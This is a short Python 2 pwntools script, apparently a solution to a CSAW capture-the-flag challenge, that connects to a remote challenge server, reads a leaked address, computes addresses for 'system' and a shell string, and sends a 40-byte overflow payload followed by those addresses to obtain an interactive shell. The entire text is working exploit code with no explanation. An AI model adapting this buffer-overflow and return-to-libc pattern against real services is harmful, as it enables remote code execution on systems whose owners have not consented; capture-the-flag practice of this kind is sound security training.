from pwn import *
import binascii

r=remote('pwn.chal.csaw.io',1005)
s= r.recvuntil('\n')
s= r.recvuntil('\n')
s=s.split(' ')[3].split('\n')[0]
system=(int(s,16)-0x10470)
binsh=0x67f32f76c33a2f-int(s,16)
#s=int(s,16)
#s=s-88640
print s
print hex(system)
print hex(binsh)
#print p64(s)
r.sendline('A'*40+p64(system)+p64(binsh))
#r.sendline(p64(s))
r.interactive()
#s= r.recvuntil('\n')
#print s

